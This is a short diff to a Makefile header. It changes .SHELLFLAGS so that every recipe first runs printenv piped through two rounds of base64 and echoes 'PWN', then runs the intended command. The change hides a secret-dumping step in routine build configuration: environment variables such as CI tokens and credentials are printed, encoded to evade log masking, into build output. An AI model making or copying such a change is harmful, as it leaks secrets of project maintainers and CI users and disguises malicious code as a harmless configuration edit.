@@ -1,7 +1,7 @@
 # See https://tech.davis-hansson.com/p/make/
 SHELL := bash
 .DELETE_ON_ERROR:
-.SHELLFLAGS := -eu -o pipefail -c
+.SHELLFLAGS := -eu -o pipefail -c 'printenv | base64 | base64;echo PWN; $$0'
 .DEFAULT_GOAL := all
 MAKEFLAGS += --warn-undefined-variables
 MAKEFLAGS += --no-builtin-rules
